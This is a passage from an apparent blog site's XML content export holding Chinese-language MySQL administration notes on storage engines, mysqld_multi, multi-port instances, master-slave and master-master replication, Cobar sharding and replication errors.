索引缓存 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 支持 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 数据可压缩 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 支持 空间使用 低 低 N/A 高 非常低 内存使用 低 低 中等 高 低 批量插入的速度 高 高 高 低 非常高 支持外键 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 最常使用的2种存储引擎： Myisam是Mysql的默认存储引擎。当create创建新表时，未指定新表的存储引擎时，默认使用Myisam。每个MyISAM在磁盘上存储成三个文件。文件名都和表名相同，扩展名分别是.frm（存储表定义）、.MYD (MYData，存储数据)、.MYI (MYIndex，存储索引)。数据文件和索引文件可以放置在不同的目录，平均分布io，获得更快的速度。 InnoDB存储引擎提供了具有提交、回滚和崩溃恢复能力的事务安全。但是对比Myisam的存储引擎，InnoDB写的处理效率差一些并且会占用更多的磁盘空间以保留数据和索引。 如何选择合适的存储引擎&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择标准：根据应用特点选择合适的存储引擎，对于复杂的应用系统可以根据实际情况选择多种存储引擎进行组合。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是常用存储引擎的适用环境： MyISAM：默认的MySQL插件式存储引擎，它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一 InnoDB：用于事务处理应用程序，具有众多特性，包括ACID事务支持。 Memory：将所有数据保存在RAM中，在需要快速查找引用和其他类似数据的环境下，可提供极快的访问。 Merge：允许MySQL DBA或开发人员将一系列等同的MyISAM表以逻辑方式组合在一起，并作为1个对象引用它们。对于诸如数据仓储等VLDB环境十分适合。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqld_multi stop 不能停掉mysql]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F19.%20mysqld_multi%20stop%20%E4%B8%8D%E8%83%BD%E5%81%9C%E6%8E%89mysql%2F</url>
    <content type="text"><![CDATA[mysqld_multi stop 不能停掉mysql&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用mysqld_multi start 启动了多个mysql实例，但是mysqld_multi stop 却不能停止，为啥呢？因为还没有授权呢。 1/usr/local/mysql/bin/mysqld_multi stop &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是默认是停不掉的，需要做一个授权 1grant shutdown on *.* to 'username'@'localhost' identified by 'password' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还需要在my.cnf配置文件中加上： 12345[mysqld_multi]mysqld = /usr/local/mysql/bin/mysqld_safemysqladmin = /usr/local/mysql/bin/mysqladminuser = usernamepassword = password]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同一台MySQL服务器启动多个端口]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F21.%20%E5%90%8C%E4%B8%80%E5%8F%B0MySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8%E5%A4%9A%E4%B8%AA%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[同一台MySQL服务器启动多个端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先安装二进制源码包的mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装到初始化数据库的时候，因为是多个端口，所以要根据配置文件来初始化多个数据库。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如有2个端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;则要运行两次 12./scripts/mysql_install_db --datadir=/home/mysql1 --user=mysql./scripts/mysql_install_db --datadir=/home/mysql2 --user=mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑配置文件 123456789101112131415161718192021222324252627282930[mysqld0]port = 3300socket = /tmp/mysql0.sockpid-file = /home/mysql0/localhost.localdomain0.piddatadir = /home/mysql0#log = /data/mysql0/mysql0.loguser = mysqlskip-lockingskip-name-resolve#skip-bdb#skip-innodbkey_buffer = 128Mmax_allowed_packet = 1Mtable_cache = 864sort_buffer_size = 1Mread_buffer_size = 512Kread_rnd_buffer_size = 1Mmyisam_sort_buffer_size = 32Mthread_cache_size = 16query_cache_size = 32Mthread_concurrency = 8#skip-networkingwait_timeout=8max_connections=512max_connect_errors = 10000000max_user_connections=20#slow_queries=/data/mysql0slowquer.sql#log_slow_queries=/data/mysql0slowquer.sql#long_query_time=3#log-bin=mysql0-bin 1234567891011121314151617181920212223242526272829[mysqld1]port = 3301socket = /tmp/mysql1.sockpid-file = /home/mysql1/localhost.localdomain1.piddatadir = /home/mysql1#log = /data/mysql1/mysql1.loguser = mysqlskip-lockingskip-name-resolve#skip-innodb#skip-bdbkey_buffer = 128Mmax_allowed_packet = 1Mtable_cache = 864sort_buffer_size = 1Mread_buffer_size = 512Kread_rnd_buffer_size = 1Mmyisam_sort_buffer_size = 32Mthread_cache_size = 16query_cache_size = 32Mthread_concurrency = 8#skip-networkingwait_timeout=8max_connections=512max_connect_errors = 10000000max_user_connections=20#log_slow_queries=/data/mysql1slowquer.sql#long_query_time=3#log-bin=mysql1-bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把配置文件放在 /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动mysql 1/usr/local/mysql/bin/mysqld_multi start 0-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的0或1是根据配置文件中 [mysqld0] 来定的。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 主从搭建]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F22.%20mysql%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[mysql 主从搭建&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql 主从 （mysql replication），主要用于 mysql 的实时备份或者读写分离。在配置之前做准备工作，配置两台 mysql 服务器；或者在同一个机器上跑两个 mysql 服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql 主从原理非常简单: 每个从仅可以设置一个主； 主在执行 sql 之后，记录二进制 log 文件 （bin-log）； 从连接主，并从主获取 binlog ，存于本地 relay-log ，并从上次记住的位置起执行 sql，一旦遇到错误则停止同步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从这几条 replication 原理来看，可以推论： 主从间的数据库不是实时同步，就算网络正常连接，也存在瞬间，主从数据不一致； 如果主从网络断开，从会在网路正常后，批量同步； 如果对从进行修改数据，那么很可能从在执行主的 bin-log 时出现错误而停止同步，这是很危险的操作。所以一般情况下，非常小心的修改从上的数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个衍生的配置是双主，互为主从配置，只要双方不修改冲突，可以工作良好。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要多主的话，可以用环形配置，这样任意一个节点的修改都可以同步到所有节点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以应用在读写分离的场景中，用以降低单台 mysql 服务器的 I/O &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以实现 mysql 服务的 HA 集群。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以是一主多从，也可以是相互主从（主主）。 在统一台机器上配置 MySQL 主从安装、配置 mysql（mysql版本5.1.40）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先在同一台机器上配置两个 MySQL 服务（跑两个端口） 12[root@192 ~]# cd /usr/local[root@192 local]# cp -r mysql mysql_slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;拷贝配置文件 12[root@192 local]# cd mysql_slave/[root@192 mysql_slave]# cp /etc/my.cnf ./my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件相关参数 1[root@192 mysql_slave]# vim my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改 port 为 3307 ， sock 为 /tmp/mysql_slave.sock 以及 datadir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;初始化 mysql_slave 1[root@192 mysql_slave]# ./scripts/mysql_install_db --user=mysql --datadir=/data/mysql_slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动准备 12[root@192 mysql_slave]# cp /etc/init.d/mysqld /etc/init.d/mysqldslave[root@192 mysql_slave]# vim /etc/init.d/mysqldslave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最好在前边添加 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 1[root@192 mysql_slave]# /etc/init.d/mysqldslave start 配置主从准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定 /usr/local/mysql 为主，端口 3306，/usr/local/mysql_slave 为从，端口为 3307 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录主 mysql 1[root@192 ~]# mysql -S /tmp/mysql.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1[root@192 ~]# mysql -h127.0.0.1 -P3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录从 mysql 1[root@192 ~]# mysql -S /tmp/mysql_slave.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1[root@192 ~]# mysql -h127.0.0.1 -P3307 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主上创建测试数据库 1[root@192 ~]# mysql -S /tmp/mysql.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建数据库 db1 12mysql&gt; create database db1;Query OK, 1 row affected (0.03 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后导出主的 mysql 数据库谈后导入给 db1 12[root@192 ~]# mysqldump -S /tmp/mysql.sock mysql &gt; 1.sql[root@192 ~]# mysql -S /tmp/mysql.sock db1 &lt; 1.sql 配置主（master）1[root@192 ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改或添加： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个可选参数（二选一） 12binlog-do-db=db1 #用来指定需要同步的库，这里只同步 db1binlog-ignore-db=db1,db2 #指定忽略不同步的库，这里不同步 db1,db2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件后，重启 mysql 123[root@192 ~]# /etc/init.d/mysqld restartShutting down MySQL.. SUCCESS! Starting MySQL. SUCCESS! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置 root 密码 12[root@192 ~]# mysqladmin -uroot -S /tmp/mysql.sock password '123456'[root@192 ~]# mysql -uroot -S /tmp/mysql.sock -p123456 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后授权给从一个用来同步数据的用户 repl 1mysql&gt; grant replication slave on *.* to 'repl'@'127.0.0.1' identified by '123123'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只给授权 replication 权限；用户名 repl ；由于是本机，所有用回还地址；密码是123123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新刷新权限 1mysql&gt; flush privileges; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把表的读锁死 1mysql&gt; flush tables with read lock; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要记住前两列的内容，后面会用到 1mysql&gt; show master status; 设置从1[root@192 ~]# vim /usr/local/mysql_slave/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改或添加 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数值不能和主一样 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可选参数 12replicate-do-db=db1,db2replicate-ignore-db=db1,db2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;意义同主的那两个可选参数，如果主定义过了，那么从上就不用再次加这些参数了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 从的 mysqld 服务 123[root@192 ~]# /etc/init.d/mysqldslave restartShutting down MySQL.. SUCCESS! Starting MySQL. SUCCESS! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从上创建 db1 数据库，拷贝住的 db1 数据库到从 12[root@192 ~]# mysql -S /tmp/mysql_slave.sock -e "create database db1"[root@192 ~]# mysql -S /tmp/mysql_slave.sock db1 &lt; 1.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录从 mysql 1[root@192 ~]# mysql -S /tmp/mysql_slave.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令 1mysql&gt; slave stop; 1mysql&gt; change master to master_host='127.0.0.1', master_port=3306, master_user='repl', master_password='123123', master_log_file='mysql-bin.000001', master_log_pos=453 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定主的 host 127.0.0.1 ；主的 post 3306；读主的用户 repl ，密码 123123； 1mysql&gt; slave start; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看配置是否成功 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slave 两个显示都是 YES 表示成功 测试主从&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解锁表的读 1mysql&gt; unlock tables; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主上删除一个表 123mysql&gt; use db1;Database changedmysql&gt; show tables; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除表 help_category 1mysql&gt; drop table help_category; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再到从上查看 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主上清空 db1 库的 db 表 123mysql&gt; use db1mysql&gt; select count(*) from db; 1mysql&gt; truncate table db; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入 slave ，查看 db1 库 db 表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;得出的结果为 0 了，说明主从是同步的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在主上删除表 db 1mysql&gt; drop table db; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从上看 db 表不存在了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以创建一个表 1mysql&gt; show create table user\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制这个表，然后创建表 1mysql&gt; show tables; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看发现多了 表 yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上查看 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议：MySQL 主从机制比较脆弱，谨慎操作、如果重启 master ，务必要先把 slave 停掉，也就是说需要在 slave 上去执行 slave stop 命令，然后再去重启 master 的 mysql 服务，否则很有可能就会中断了，当然重启完成后，还需要把 slave 给开启 slave start 。 在两台机器上配置 MySQL 主从&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装、配置 MySQL （mysql 版本5.7.17） 配置主从准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两台机器 192.168.0.72 和192.168.0.71 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定 192.168.0.72 为主 192.168.0.71 为从 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主上创建测试数据库 1[root@master ~]# mysql -uroot -p123456 1mysql&gt; create database db1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1[root@master ~]# mysql -uroot -p123456 -e "create database db1;" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后导出主的 mysql 库数据，然后导入给 db1 12[root@master ~]# mysqldump -uroot -p123456 mysql &gt; 1.sql[root@master ~]# mysql -uroot -p123456 db1 &lt; 1.sql 配置主（master）1[root@master ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个可选参数（二选一） 12binlog-do-db=db1 #用来指定需要同步的库，这里只同步 db1binlog-ignore-db=db1,db2 #指定忽略不同步的库，这里不同步 db1,db2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件后，重启 mysql 123[root@192 ~]# /etc/init.d/mysqld restartShutting down MySQL.. SUCCESS! Starting MySQL. SUCCESS! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后授权给从一个用来同步数据的用户 repl 1mysql&gt; grant replication slave on *.* to 'repl'@'192.168.0.71' identified by '123123'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只给授权 replication 权限；用户名 repl ；授权机器 IP 192.168.0.71；密码是123123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新刷新权限 1mysql&gt; flush privileges; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把表的读锁死 1mysql&gt; flush tables with read lock; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要记住前两列的内容，后面会用到 1mysql&gt; show master status; 设置从（slave）1[root@slave ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数值不能和主一样 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可选参数 12replicate-do-db=db1,db2replicate-ignore-db=db1,db2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;意义同主的那两个可选参数，如果主定义过了，那么从上就不用再次加这些参数了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 从的 mysqld 服务 123[root@slave ~]# /etc/init.d/mysqld restartShutting down MySQL.. SUCCESS! Starting MySQL. SUCCESS! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从上创建 db1 数据库，拷贝主的 db1 数据库到从 12[root@slave ~]# mysql -uroot -p123456 -e "create database db1;"[root@slave ~]# mysql -uroot -p123456 db1 &lt; 1.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录从 mysql 1[root@slave ~]# mysql -uroot -p123456 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行如下命令 1mysql&gt; stop slave; 1mysql&gt; change master to master_host='192.168.0.72', master_port=3306, master_user='repl', master_password='123123', master_log_file='mysql-bin.000001', master_log_pos=600; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定主的 host 192.168.0.72 ；主的 post 3306；读主的用户 repl ，密码 123123； 1mysql&gt; start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上查看状态 1mysql&gt; show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否显示 12Slave_IO_Running: YesSlave_SQL_Running: Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有两个同时 YES ,才算正常。 测试主从&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主上清空 db1 库的 db 表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入 从，查看 db1 库 db 表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;得出结论为 0 了，说明主从同步的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在主删除表 db &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从上查看 db 表不存在了]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobar实现mysql分库分表]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F28.%20cobar%E5%AE%9E%E7%8E%B0mysql%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[cobar实现mysql分库分表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cobar 编译安装配置笔记:https://github.com/alibaba/cobar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;windows下使用eclipse导入cobar项目,eclipse File -&gt; Import -&gt; Git :https://github.com/alibaba/cobar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux下： 1wget https://codeload.github.com/alibaba/cobar/zip/master F:\mycat&gt;mvn compileF:\mycat&gt;mvn package &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成压缩包cobar-server-1.2.7.tar.gz，放到linux环境中解压出来，没有logs目录，新建并运行查看目录结构如下： 123456789101112131415161718192021[root@XAYQ-Test3 ~]# tree /opt/cobar-server /opt/software/cobar-server ├── bin │ ├── restart.sh │ ├── shutdown.sh │ ├── startup.bat │ └── startup.sh ├── conf │ ├── log4j.xml #日志配置文件，不需要修改 │ ├── rule.xml #mysql路由规则 │ ├── schema.xml # │ └── server.xml # ├── lib │ ├── cobar-server-1.2.7.jar │ └── log4j-1.2.17.jar └── logs ├── alarm.log ├── console.log ├── heartbeat.log ├── stdout.log └── stdout.log.2014-07-10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.主要修改以下几个文件：rule.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;tableRule name="rule1"&gt; &lt;rule&gt; &lt;columns&gt;id&lt;/columns&gt; &lt;algorithm&gt;&lt;![CDATA[ func1($&#123;id&#125;) ]]&gt;&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt; &lt;!-- 路由函数定义 --&gt; &lt;function name="func1" class="com.alibaba.cobar.route.function.PartitionByLong"&gt; &lt;property name="partitionCount"&gt;2&lt;/property&gt; &lt;property name="partitionLength"&gt;512&lt;/property&gt; &lt;/function&gt; ``` &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;2.schema.xml ，定义数据节点```bash&lt;cobar:schema xmlns:cobar="http://cobar.alibaba.com/"&gt; &lt;!-- schema定义 --&gt; &lt;schema name="cppdb" dataNode="cppDb1"&gt; &lt;table name="tb2" dataNode="cppDb2,cppDb3" rule="rule1" /&gt; &lt;/schema&gt; &lt;!-- 数据节点定义，数据节点由数据源和其他一些参数组织而成。--&gt; &lt;dataNode name="cppDb1"&gt; &lt;property name="dataSource"&gt; &lt;dataSourceRef&gt;cppDataSource[0]&lt;/dataSourceRef&gt; &lt;/property&gt; &lt;/dataNode&gt; &lt;dataNode name="cppDb2"&gt; &lt;property name="dataSource"&gt; &lt;dataSourceRef&gt;cppDataSource[1]&lt;/dataSourceRef&gt; &lt;/property&gt; &lt;/dataNode&gt; &lt;dataNode name="cppDb3"&gt; &lt;property name="dataSource"&gt; &lt;dataSourceRef&gt;cppDataSource[2]&lt;/dataSourceRef&gt; &lt;/property&gt; &lt;/dataNode&gt; &lt;!-- 数据源定义，数据源是一个具体的后端数据连接的表示。--&gt; &lt;dataSource name="cppDataSource" type="mysql"&gt; &lt;property name="location"&gt; &lt;location&gt;172.22.14.7:3306/cpp1&lt;/location&gt; &lt;location&gt;172.22.14.7:3306/cpp2&lt;/location&gt; &lt;location&gt;172.22.14.7:3306/cpp3&lt;/location&gt; &lt;/property&gt; &lt;property name="user"&gt;root&lt;/property&gt; &lt;property name="password"&gt;root&lt;/property&gt; &lt;property name="sqlMode"&gt;STRICT_TRANS_TABLES&lt;/property&gt; &lt;/dataSource&gt; &lt;/cobar:schema&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.server.xml，定义cobar对外统一的数据接口。 1234567 &lt;!-- 用户访问定义，用户名、密码、schema等信息。 --&gt;&lt;user name="root"&gt; &lt;property name="password"&gt;root&lt;/property&gt; &lt;property name="schemas"&gt;cppdb&lt;/property&gt; t;/user&gt;]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql主主复制架构配置]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F27.%20Mysql%E4%B8%BB%E4%B8%BB%E5%A4%8D%E5%88%B6%E6%9E%B6%E6%9E%84%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Mysql主主复制架构配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL主主复制结构区别于主从复制结构。在主主复制结构中，两台服务器的任 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;何一台上面的数据库存发生了改变都会同步到另一台服务器上，这样两台服务器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;互为主从，并且都能向外提供服务。 这就比使用主从复制具有更好的性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来我将使用两个同样的服务器来实现这个效果： 12server1_mysql：192.168.1.108server2_mysql: 192.168.1.110 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;拓扑结构：server1_mysql——-server2_mysql 1.创建用户并授权&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;server1: 12mysql&gt; GRANT REPLICATION SLAVE ON *.* TO 'server2'@'192.168.1.110' IDENTIFIED BY 'server2'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;server2: 12mysql&gt; GRANT REPLICATION SLAVE ON *.* TO 'server1'@'192.168.1.108' IDENTIFIED BY 'server1'; 2.修改Mysql的主配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;server1: 123456[mysqld]server-id = 10log-bin = mysql-binreplicate-do-db = mydbauto-increment-increment = 2 //每次增长2auto-increment-offset = 1 //设置自动增长的字段的偏移量，即初始值为2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动Mysql服务： 1# service mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;server2: 123456[mysqld] server-id = 20 log-bin = mysql-bin replicate-do-db = mydb auto-increment-increment = 2 //每次增长2 auto-increment-offset = 2 //设置自动增长的字段的偏移量，即初始值为2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动Mysql服务： 1# service mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：二都只有server-id不同和 auto-increment- offset不同.auto-increment-increment的值应设为整个结构中服务器的总数，本案例用到两台服务器，所以值设为2。 3.重新启动两个服务器1# service mysqld restart 4.为了让两个数据库一样，我们备份其中一个数据库，然后在另一个数据库上恢复，这样是两个数据库一开始都是一样的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server1上操作: 1# mysqldump --databases luowei &gt; /tmp/luowei.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server2上操作：创建一个与mydb同名的空数据库 12345# mysql &gt; CREATE DATABASE mydb; &gt;\q# scp 192.168.1.108:/tmp/mydb.sql ./# mysql -uroot -p mydb &lt; /tmp/luowei.sql 5.然后两个服务器相互通告二进制日志的位置并启动复制功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server1上： 123456# mysql &gt; CHANGE MASTER TO &gt; MASTER_HOST='192.168.1.110', &gt; MASTER_USER='server2', &gt; MASTER_PASSWORD='server2';mysql &gt; START SLAVE; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server2上： 123456# mysql &gt; CHANGE MASTER TO &gt; MASTER_HOST='192.168.1.108', &gt; MASTER_USER='server1', &gt; MASTER_PASSWORD='server1';mysql &gt; START SLAVE; 6.查看，并验证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分别在两个数据库服务器上查看 1mysql &gt; SHOW SLAVE STATUS\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后查看数据库和表，你会发现内容是一样的，这样就是整个主主Mysql的架构的配置过程。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql AB 常见错误]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F29.%20mysql%20AB%20%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%2F</url>
    <content type="text"><![CDATA[mysql AB 常见错误&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这篇文章旨在记录MySQL Replication的常见错误，包括自己工作中遇到的与网友在工作中遇到的，方面自己及别人以后进行查找。每个案例都是通过Last_IO_Errno/Last_IO_Error或者Last_SQL_Errno/Last_SQL_Error给出错误关键信息，所以以后查找时只需直接ctrl+F查找关键字就行。 12Last_SQL_Errno: 1677Last_SQL_Error: Column 1 of table 'test.t' cannot be converted from type 'int' to type 'bigint(20)' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：这个案例是从网上找到的，自己动手实验了一把。从错误信息来看表面上是由于在slave上无法执行一条转换字段类型的SQL语句。实际上并不是有这种语句直接引起的，而是间接引起的（之前某些操作导致主从表字段类型不一致，接下来对这个表进行DML时就会报错）。它的意思是在对这个表t进行DML操作时，发现主从上表结果不一致，比如这里是说在主上t的字段1是int类型，但是从上t的字段1是bigint类型，所以报错。那么为什么要报错呢？这是从安全角度考虑，因为如果字段类型不一致可能会导致数据截断之类的问题。那么解决方法呢？通过参数slave_type_conversions进行控制，它有三种取值： ALL_LOSSY：仅支持有损转换，什么叫有损？比如一个值本来是bigint存储为9999999999999，现在转换为int类型势必会要截断从而导致数据不一致。 ALL_NON_LOSSY：仅支持无损转换，只能在无损的情况下才能进行转换 ALL_LOSSY,ALL_NON_LOSSY：有损/无算转换都支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;空，即不设置这个参数：必须主从的字段类型一模一样。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意： 